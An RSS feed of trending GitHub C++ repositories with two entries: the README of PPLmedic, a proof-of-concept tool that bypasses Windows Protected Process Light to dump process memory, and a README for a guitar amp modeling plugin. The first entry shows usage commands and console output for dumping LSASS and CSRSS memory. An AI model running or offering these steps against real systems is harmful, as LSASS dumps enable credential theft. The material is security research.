<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C++ Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-03-20T01:31:42Z</updated>
  <subtitle>Daily Trending of C++ in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>itm4n/PPLmedic</title>
    <updated>2023-03-20T01:31:42Z</updated>
    <id>tag:github.com,2023-03-20:/itm4n/PPLmedic</id>
    <link href="https://github.com/itm4n/PPLmedic" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Dump the memory of any PPL with a Userland exploit chain&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PPLmedic&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/itm4n/PPLmedic/master/poc.png&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;This tool implements a &lt;strong&gt;Userland&lt;/strong&gt; exploit chain for injecting arbitrary code into a PPL with the signer type &lt;code&gt;Windows&lt;/code&gt; and elevating to the signer type &lt;code&gt;WinTcb&lt;/code&gt;. These techniques were originally discussed by James Forshaw (a.k.a. &lt;a href=&#34;https://infosec.exchange/@tiraniddo&#34;&gt;@tiraniddo&lt;/a&gt;) in his blog post &lt;a href=&#34;https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html&#34;&gt;Injecting Code into Windows Protected Processes using COM - Part 1&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To learn more about this tool, you should read its companion blog post here:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.scrt.ch/2023/03/17/bypassing-ppl-in-userland-again/&#34;&gt;Bypassing PPL in Userland (again)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;üí£ Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;I would qualify this tool as an &lt;em&gt;advanced Proof-of-Concept&lt;/em&gt;. You should think twice before using it on a real engagement. It is safe to use as long as it is &lt;strong&gt;not interrupted&lt;/strong&gt;, which cannot be guaranteed in the presence of an EDR for instance.&lt;/p&gt; &#xA;&lt;p&gt;It modifies important registry keys related to the Windows Update Medic service. At worst, if those registry keys are not restored properly, this service will fail to function properly, but this &lt;strong&gt;will not crash&lt;/strong&gt; the OS.&lt;/p&gt; &#xA;&lt;h2&gt;üìù Usage&lt;/h2&gt; &#xA;&lt;p&gt;Prerequisites:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Privileges:&lt;/strong&gt; Administrator or SYSTEM with &lt;code&gt;SeDebugPrivilege&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Platform:&lt;/strong&gt; Windows 10/11 or Windows Server 2019/2022&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Architecture:&lt;/strong&gt; Only &lt;strong&gt;x86_64&lt;/strong&gt; is supported&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bat&#34;&gt;REM Use the option -p to elevate from PPL-Windows to PPL-WinTcb&#xA;PPLmedic.exe dump &#34;PID&#34; &#34;C:\FULL\PATH\TO\DUMP.dmp&#34; [-p]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Dump a PPL-Windows or below (e.g.: LSASS):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;C:\WINDOWS\system32&amp;gt;tasklist | findstr lsass&#xA;lsass.exe                      756 Services                   0     20,028 K&#xA;&#xA;C:\WINDOWS\system32&amp;gt;C:\Temp\PPLmedic.exe dump 756 c:\Temp\lsass.dmp&#xA;[...]&#xA;[+] Payload DLL successfully loaded after 272 attempts!&#xA;[*] Deleting 272 temporary directories created by the service...&#xA;[*] Connected to remote process.&#xA;[+] Remote process protection level: 0x00000002 (PsProtectedSignerWindows-Light)&#xA;[+] Memory dump of process with PID 756 successful: c:\Temp\lsass.dmp&#xA;[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Dump a PPL-WinTcb (e.g.: CSRSS):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;C:\WINDOWS\system32&amp;gt;tasklist | findstr csrss&#xA;csrss.exe                      520 Services                   0     26,420 K&#xA;csrss.exe                      608 Console                    1     57,548 K&#xA;&#xA;C:\WINDOWS\system32&amp;gt;C:\Temp\PPLmedic.exe dump 520 c:\Temp\csrss.dmp -p&#xA;[...]&#xA;[+] Payload DLL successfully loaded after 181 attempts!&#xA;[*] Deleting 181 temporary directories created by the service...&#xA;[*] Connected to remote process.&#xA;[+] Remote process protection level: 0x00000002 (PsProtectedSignerWindows-Light)&#xA;[*] Attempting to get a higher process protection level...&#xA;[+] Target file &#39;C:\Users\LAB-AD~1\AppData\Local\Temp\faultrep.dll&#39; should now be cache signed (level=12 - Windows).&#xA;[*] Connected to remote process.&#xA;[+] Remote process protection level: 0x00000000 (PsProtectedSignerWinTcb-Light)&#xA;[+] Memory dump of process with PID 520 successful: c:\Temp\csrss.dmp&#xA;[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;üìã Tests&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Windows version&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;PPL-Windows&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;PPL-WinTcb&lt;/th&gt; &#xA;   &lt;th&gt;Observation&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Windows 10&lt;/strong&gt; 22H2 Build 19045.2673&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;‚úî&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;‚úî&lt;/td&gt; &#xA;   &lt;td&gt;N/A&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Windows 11&lt;/strong&gt; 22H2 Build 22621.1344&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;‚ö†&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;‚ùå&lt;/td&gt; &#xA;   &lt;td&gt;Frequent service crash + Fake cached signature exploit does not seem to work.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Windows Server 2019&lt;/strong&gt; Version 1809 Build 17763.4010&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;‚úî&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;‚úî&lt;/td&gt; &#xA;   &lt;td&gt;N/A&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Windows Server 2022&lt;/strong&gt; Version 21H2 Build 20348.1547&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;‚úî&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;‚úî&lt;/td&gt; &#xA;   &lt;td&gt;N/A&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;üöß Known issues&lt;/h2&gt; &#xA;&lt;h3&gt;Error: &#34;Unexpected error or timeout&#34;&lt;/h3&gt; &#xA;&lt;p&gt;You get the following error because the exploit &lt;strong&gt;timed out&lt;/strong&gt; while trying to create a remote &lt;code&gt;TaskHandler&lt;/code&gt; COM object. This is usually the sign that the target service &lt;code&gt;WaaSMedicSvc&lt;/code&gt; crashed. This can be confirmed with the next message: &lt;code&gt;[!] Service WaaSMedicSvc is no longer running&lt;/code&gt;. &lt;strong&gt;You should try to run the tool again.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;C:\Windows\System32&amp;gt;C:\Temp\PPLmedic.exe dump 1234 C:\Temp\1234.dmp&#xA;[...]&#xA;[*] Trying to write a valid object directory handle...&#xA;[*] Attempt 100/1000 (10%)&#xA;[*] Attempt 200/1000 (20%)&#xA;[-] Unexpected error or timeout while trying to create a remote TaskHandler instance.&#xA;[!] Service WaaSMedicSvc is no longer running, it probably crashed because of an invalid handle value.&#xA;[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Error: &#34;Reached the maximum number of attempts&#34;&lt;/h3&gt; &#xA;&lt;p&gt;You get the following error because the exploit failed to write a valid object directory in &lt;strong&gt;less than 1000 attempts&lt;/strong&gt;. This limit serves as a failsafe to prevent the target service from consuming too much resources. &lt;strong&gt;You should try to run the tool again.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;C:\Windows\System32&amp;gt;C:\Temp\PPLmedic.exe dump 1234 C:\Temp\1234.dmp&#xA;[...]&#xA;[*] Trying to write a valid object directory handle...&#xA;[...]&#xA;[*] Attempt 1000/1000 (100%)&#xA;[-] Reached the maximum number of attempts.&#xA;[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Error: &#34;Failed to write LdrpKnownDllDirectoryHandle value&#34;&lt;/h3&gt; &#xA;&lt;p&gt;You get the following error because an unexpected error occurred when calling &lt;code&gt;LaunchDetectionOnly&lt;/code&gt; or &lt;code&gt;LaunchRemediationOnly&lt;/code&gt;. This should be quite rare though. &lt;strong&gt;You should try to run the tool again.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;C:\Windows\System32&amp;gt;C:\Temp\PPLmedic.exe dump 1234 C:\Temp\1234.dmp&#xA;[...]&#xA;[*] Trying to write a valid object directory handle...&#xA;[*] Attempt 100/1000 (10%)&#xA;[*] Attempt 200/1000 (20%)&#xA;[-] Failed to write LdrpKnownDllDirectoryHandle value (thread exit code: 0x800706ba).&#xA;[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Error: &#34;Failed to cache sign ...&#34;&lt;/h3&gt; &#xA;&lt;p&gt;You get the following error because the exploit &lt;strong&gt;failed to cache sign&lt;/strong&gt; the payload DLL. The oplock set on the catalog file was probably never triggered because it was already opened by the Kernel. You can try to rerun the tool at a later time (for Windows 11, refer to the &#34;Tests&#34; section).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;C:\Windows\System32&amp;gt;C:\Temp\PPLmedic.exe dump 1234 C:\Temp\1234.dmp -p&#xA;[...]&#xA;[*] Trying to write a valid object directory handle...&#xA;[+] Payload DLL successfully loaded after 1 attempts!&#xA;[*] Connected to remote process.&#xA;[+] Remote process protection level: 0x00000002 (PsProtectedSignerWindows-Light)&#xA;[*] Attempting to get a higher process protection level...&#xA;[-] Failed to cache sign &#39;C:\Users\LAB-AD~1\AppData\Local\Temp\faultrep.dll&#39; (LE: 997).&#xA;[...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;üèó Build instructions&lt;/h2&gt; &#xA;&lt;p&gt;This Visual Studio Solution comprises two projects (the executable and a payload DLL) that need to be compiled in a specific order. Everything is pre-configured, so you just have to follow these simple instructions. The compiled payload DLL is automatically embedded into the final executable.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Open the Solution with Visual Studio 2019.&lt;/li&gt; &#xA; &lt;li&gt;Select &lt;code&gt;Release / x64&lt;/code&gt; (&lt;code&gt;x86&lt;/code&gt; is not supported!).&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Build &amp;gt; Build Solution&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;üéñ Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://infosec.exchange/@tiraniddo&#34;&gt;@tiraniddo&lt;/a&gt; - Injecting Code into Windows Protected Processes using COM - Part 1&lt;br&gt; &lt;a href=&#34;https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html&#34;&gt;https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>sdatkinson/NeuralAmpModelerPlugin</title>
    <updated>2023-03-20T01:31:42Z</updated>
    <id>tag:github.com,2023-03-20:/sdatkinson/NeuralAmpModelerPlugin</id>
    <link href="https://github.com/sdatkinson/NeuralAmpModelerPlugin" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Plugin for Neural Amp Modeler&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Neural Amp Modeler Plug-in&lt;/h1&gt; &#xA;&lt;p&gt;A VST3/AudioUnit plug-in* for &lt;a href=&#34;https://github.com/sdatkinson/neural-amp-modeler&#34;&gt;Neural Amp Modeler&lt;/a&gt;, built with &lt;a href=&#34;https://iplug2.github.io&#34;&gt;iPlug2&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/user/RunawayThumbtack&#34;&gt;https://www.youtube.com/user/RunawayThumbtack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/sdatkinson/neural-amp-modeler&#34;&gt;https://github.com/sdatkinson/neural-amp-modeler&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;Check the &lt;a href=&#34;https://github.com/sdatkinson/NeuralAmpModelerPlugin/releases&#34;&gt;Releases&lt;/a&gt; for pre-built installers for the plugin!&lt;/p&gt; &#xA;&lt;h2&gt;About&lt;/h2&gt; &#xA;&lt;p&gt;This is a cleaned up version of &lt;a href=&#34;https://github.com/sdatkinson/iPlug2&#34;&gt;the original iPlug2-based NAM plugin&lt;/a&gt; with some refactoring to adopt better practices recommended by the developers of iPlug2. (Thanks &lt;a href=&#34;https://github.com/olilarkin&#34;&gt;Oli&lt;/a&gt; for your generous suggestions!)&lt;/p&gt; &#xA;&lt;p&gt;*could also support VST2, AAX, CLAP, Linux, iOS soon.&lt;/p&gt;</summary>
  </entry>
</feed>